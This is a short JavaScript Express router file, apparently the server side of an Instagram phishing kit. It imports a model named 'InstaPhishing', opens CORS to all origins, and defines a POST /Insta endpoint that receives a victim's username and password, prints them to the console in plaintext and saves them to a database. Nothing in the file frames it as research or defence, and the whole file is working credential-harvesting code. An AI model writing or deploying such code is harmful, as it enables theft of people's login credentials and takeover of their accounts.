import express from 'express';
import cors from 'cors'; // Import cors module
import { instadb } from './models/InstaPhishing.js';

const router = express.Router();

// Enable CORS for all requests
router.use(cors());
router.use(express.json()); // Ensure JSON body parsing middleware is applied

// Default route
router.get('/', async (req, res) => {
  res.json("Hello from Service");
});

// Route to handle Instagram credentials
router.post('/Insta', async (req, res) => {
  try {
    const { username, password } = req.body;
    console.log(`Received -> Username: ${username}, Password: ${password}`);

    const dataSave = new instadb({
      username: username,
      Password: password
    });

    await dataSave.save();
    res.json({ status: "true" });
  } catch (error) {
    console.error("Error saving data:", error);
    res.status(500).json({ status: "false", error: "Internal Server Error" });
  }
});

export { router as UserRouter };
